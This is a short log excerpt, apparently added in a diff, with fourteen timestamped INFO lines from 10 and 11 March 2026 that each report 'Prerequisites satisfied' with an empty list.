+[2026-03-10 20:57:51] INFO: Prerequisites satisfied []
+[2026-03-10 20:58:07] INFO: Prerequisites satisfied []
+[2026-03-11 10:47:29] INFO: Prerequisites satisfied []
+[2026-03-11 10:47:34] INFO: Prerequisites satisfied []
+[2026-03-11 11:03:32] INFO: Prerequisites satisfied []
+[2026-03-11 11:03:34] INFO: Prerequisites satisfied []
+[2026-03-11 11:35:20] INFO: Prerequisites satisfied []
+[2026-03-11 11:35:32] INFO: Prerequisites satisfied []
+[2026-03-11 11:38:52] INFO: Prerequisites satisfied []
+[2026-03-11 11:39:47] INFO: Prerequisites satisfied []
+[2026-03-11 14:19:14] INFO: Prerequisites satisfied []
+[2026-03-11 14:19:16] INFO: Prerequisites satisfied []
+[2026-03-11 14:21:32] INFO: Prerequisites satisfied []
+[2026-03-11 14:21:33] INFO: Prerequisites satisfied []
